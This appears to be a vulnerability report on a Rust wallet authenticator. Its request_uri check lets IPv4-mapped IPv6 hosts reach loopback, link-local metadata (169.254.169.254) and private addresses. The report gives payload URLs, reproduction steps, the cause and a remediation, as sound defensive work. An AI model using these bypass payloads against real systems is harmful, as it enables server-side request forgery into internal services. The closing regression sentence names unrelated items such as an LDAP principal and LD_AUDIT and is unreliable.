Another app on the device, or any component that can deliver a VIEW intent to the exported wallet activity, supplies an otherwise well-formed invocation whose request_uri host is the IPv4-mapped form of a loopback, link-local, or RFC1918 address.

### Input

- `https://auth.opensesame.example/invoke/oid4vp?request_uri=https%3A%2F%2F%5B%3A%3Affff%3A127.0.0.1%5D%2Frequest`
- `https://auth.opensesame.example/invoke/oid4vci?request_uri=https%3A%2F%2F%5B%3A%3Affff%3Aa9fe%3Aa9fe%5D%2Flatest`
- `https://auth.opensesame.example/invoke/oid4vp?request_uri=https%3A%2F%2F%5B%3A%3Affff%3A10.1.2.3%5D%2Fx`
- `https://auth.opensesame.example/invoke/oid4vp?request_uri=https%3A%2F%2F127.0.0.1%2Frequest`

### Steps

- Build the opensesame-authenticator-core rlib from crates/authenticator-core at this commit with the default features.
- Call validate_platform_invocation with origin https://auth.opensesame.example and each payload.
- For each accepted IPv6 host, call Ipv6Addr::to_ipv4_mapped.

### Observed result

Dotted https://127.0.0.1/request and https://[::1]/request were private and rejected. https://[::ffff:127.0.0.1]/request was not: url 2.5.8 parses the bracketed literal as IPv6 and serializes it as payload https://[::ffff:7f00:1]/request with protocol_uri openid4vp://?request_uri=https%3A%2F%2F%5B%3A%3Affff%3A7f00%3A1%5D%2Frequest, and to_ipv4_mapped was 127.0.0.1. Mapped 169.254.169.254 was accepted as an Oid4vci credential_offer_uri https://[::ffff:a9fe:a9fe]/latest. Mapped 10.1.2.3 and 192.168.0.1 were accepted as Oid4vp payloads https://[::ffff:a01:203]/x and https://[::ffff:c0a8:1]/x. Dotted 169.254.169.254 was rejected. host_is_private's IPv6 arm does not call to_ipv4_mapped, and validate_platform_invocation copies the normalized URL into protocol_uri with no further host check.

### Conditions

- authentication_level: No authenticator-origin credential is required. The sender only has to place the configured https origin in the invocation URI string.
- system_configuration: MainActivity is exported and its https branch forwards accepted protocol URIs. The default invocation host is a DNS name baked into https://${INVOCATION_HOST}.

### Remediation

Classify addresses from url::Url::host instead of a bracket round-trip. For IPv6, if to_ipv4_mapped() is Some, apply the same IPv4 private, loopback, link-local, multicast, broadcast, and unspecified checks. Add a regression that the four accepted mapped payloads above return PrivateRequestUri while a public https request URI still succeeds.

Regression: add a test that uses the payloads above against the fixed decision point and expects the code or verifier, the membership row, the LDAP principal, the mapped address, or `LD_AUDIT` to be refused. Do not assert a stronger result than the observation.
